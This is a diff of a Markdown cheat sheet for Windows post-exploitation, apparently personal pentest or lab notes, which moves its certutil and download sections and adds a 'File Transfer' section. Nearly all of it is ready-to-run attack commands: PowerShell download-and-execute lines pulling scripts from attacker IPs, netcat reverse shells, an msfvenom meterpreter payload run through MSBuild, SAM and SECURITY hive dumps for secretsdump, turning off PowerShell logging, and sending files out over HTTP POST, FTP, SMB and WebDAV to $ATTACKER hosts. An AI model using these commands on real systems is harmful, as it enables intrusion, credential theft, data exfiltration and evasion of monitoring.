@@ -1,9 +1,9 @@
+
 - [Sysinternals](#sysinternals)
   - [Tools](#tools)
   - [Abusing Internals](#abusing-internals)
   - [Commands](#commands)
-  - [Windows: get file](#windows-get-file)
-    - [Connecting with nc](#connecting-with-nc)
+  - [Connecting with nc](#connecting-with-nc)
   - [Enumerate](#enumerate)
   - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
     - [Tampering with low users](#tampering-with-low-users)
@@ -21,17 +21,18 @@
   - [Enviroment Variable](#enviroment-variable)
 - [Runtime Detection](#runtime-detection)
 - [Evade Logging](#evade-logging)
-- [Living Off the Land](#living-off-the-land)
   - [File Operation](#file-operation)
-    - [Certutil](#certutil)
     - [BITSAdmin](#bitsadmin)
     - [FindStr](#findstr)
     - [Execution](#execution)
+  - [File Transfer](#file-transfer)
+    - [Download](#download)
+    - [Upload](#upload)
+    - [Encrpytion](#encrpytion)
 - [Bypass Applocker](#bypass-applocker)
   - [Privilege Escalation](#privilege-escalation)
     - [Incognito](#incognito)
     - [Potato family](#potato-family)
-
 
 ## Sysinternals
 - [LOLBAS](https://lolbas-project.github.io/#)
@@ -278,21 +279,8 @@ Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
 ```
 
 - findstr = grep
-### Windows: get file
-  - powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
-    - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
-  - nc.exe $ATTACKING_IP PORT -e cmd.exe
-  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://Attcker/File
-  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://Attcker/File', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
-  - iex(New-Object Net.WebClient).DownloadString("http://10.9.1.255:80/PowerUp.ps1")dir
-  - powershell -c wget "http://Attcker/File -outfile "PowerUp.ps1"
-  - powershell IWR -Uri 'http://10.10.16.2:8000/nc64.exe' -Outfile c:\nc.exe
 
-  - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
-  
-  - copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')
-
-#### Connecting with nc
+### Connecting with nc
 - nc.exe TARGET PORT -e cmd.exe
   
 ### Enumerate
@@ -316,10 +304,7 @@ docker run -it -p 80:80 \
 -v ~/Empire/tmp:/tmp \
 -v ~/Empire/data:$(pwd)/Empire/data/downloads \
 hoptimumthreat/powershell-empire
-
 ```
-
-
 
 ### Stabilize / Post Exploit / Persistance windows
 
@@ -356,7 +341,6 @@ reg.exe save hklm\security C:\path\to\save\security.save
 reg.exe save hklm\system C:\path\to\save\system.save
 
 python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/Downloads/security.save -system /home/kali/Downloads/system.save LOCAL
-
 
 #### Backdoor
 - find executables and "batizar"
@@ -710,26 +694,7 @@ $snap = Get-PSSnapin Microsoft.PowerShell.Core
 $snap.LogPipelineExecutionDetails = $false
 ```
 
-## Living Off the Land
-- Using and abusing of what exists
-- How
-  - Reconnaissance
-  - Files operations
-  - Arbitrary code execution
-  - Lateral movement
-  - Security product bypass
-
 ### File Operation
-
-#### Certutil
-- certification services
-- dump + diplay certfication authority
-- Ingress tool transfer
-- Download
-  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
-- Encode / Decode
-  - certutil -encode payload.exe Encoded-payload.txt
-  - certutil -decode Encoded_file payload.txt
 
 #### BITSAdmin
 - create,download, upload Background Intelligente Transfer Service (BITS = files from http and smb servers)
@@ -782,6 +747,152 @@ $snap.LogPipelineExecutionDetails = $false
   - msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
   - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
   - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+
+
+### File Transfer
+#### Download
+
+- **Enconding**
+  - md5sum
+  - [IO.File]::WriteAllBytes("C:\Path\To\File", [Convert]::FromBase64String("Encoded"))
+    - Get-FileHash C:\Path\To\File -Algorithm md5
+  
+- **PowerShell Web Downalods**
+  - (New-Object Net.Webclient).DownloadFile('Target URL', 'Output File')
+  - powershell -c "(new-object System.Net.WebClient).Downloadfile('Target URL', 'Output File')
+    - Net.WebClient = Class 
+    - DownloadFile, DownloadDataAsync, DownloadFileAsync, DownloadString  = Method
+  - Running in Memory = Invoke-Expression = IEX
+    - iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1')
+    - (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1') | IEX
+    - powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
+    - [More examples from HarmJ0y](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
+
+```
+C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
+```
+
+- **Invoke-WebRequest:**
+  - iwr, curl, wget
+  - Invoke-WebRequest http://10.10.XX.XX/Invoke-MS16032.ps1 -OutFile PowerView.ps1
+    - powershell -c Invoke-Webrequest http://Attcker/File -OutFile winPeas.bat
+  - powershell -c wget "http://Attcker/File -outfile "PowerUp.ps1"
+
+- **Possible erros**
+  - iwr -UseBasicParsing = Bypass internet explorer configuration
+  - [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} == if certificate is not tusted
+
+- **SMB**
+  - Attacker: smbserver.py
+  - Target: copy \\$ATTACLER\Share\file
+  - Authenticated:
+
+```
+# Attacker
+impacket-smbserver share -smb2support /path/to/share -user USER -password PASS
+
+# Target
+net use n: \\$ATTACKER\share /user:USER PASS
+```
+
+- **FTP**
+```
+# Attacker
+sudo python3 -m pyftpdlib --port 21
+
+# Target
+(New-Object Net.WebClient).DownloadFile('ftp://$ATTACKER/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+## Execute as file
+echo open $ATTACKER > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+
+ftp -v -n -s:ftpcommand.txt
+```
+
+- **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
+- certification services
+- dump + diplay certfication authority
+- Ingress tool transfer
+- Download
+  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+- Encode / Decode
+  - certutil -encode payload.exe Encoded-payload.txt
+  - certutil -decode Encoded_file payload.txt
+  
+- copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')
+
+
+#### Upload
+- **Base64**
+  - [Convert]::ToBase64String((Get-Content -path "C:\Path\To\File" -Encoding byte))
+    -  Get-FileHash C:\Path\To\File -Algorithm MD5 | select Hash
+ - Decode
+   - echo string | base64 -d
+ - Send body of a http request
+
+```
+# Target 
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+Invoke-WebRequest -Uri http://$ATTACKER:8000/ -Method POST -Body $b64
+
+# Attacker
+nc -lvnp 8000
+```
+
+- [uploadserver](https://github.com/Densaugeo/uploadserver)
+  - We upload PSUpload.psy ==> Invoke-RestMethod to upload
+```
+# Attacker
+python3 -m uploadserver
+sudo python3 -m pip install --user uploadserver
+
+# Target
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+Invoke-FileUpload -Uri http://$ATTACKER:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+- **SMB**
+  - using [WebDav](https://github.com/mar10/wsgidav)
+  
+```
+# Attacker
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+
+# Target
+dir \\$ATTACKER\DavWWWRoot
+  copy C:\Path\To\File \\192.168.49.129\DavWWWRoot\
+dir \\$ATTACKER\sharefolder
+  copy C:\Path\To\File \\192.168.49.129\sharefolder\
+```
+
+- **FTP**
+```
+# Attacker: create ftp server with write permissions
+sudo python3 -m pyftpdlib --port 21 --write
+
+# Target
+(New-Object Net.WebClient).UploadFile('ftp://$ATTACKER/ftp-hosts', 'C:\Path\To\File')
+
+## Execute as file
+echo open $ATTACKER > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo put c:\Path\to\file >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+
+ftp -v -n -s:ftpcommand.txt
+```
+
+#### Encrpytion
+- Upload ps1 script to target + import
+  - Import-Module .\Invoke-AESEncryption.ps1
+  - Output file.ext.aes
 
 ## Bypass Applocker
 - Applocker: restrict programs from being executed
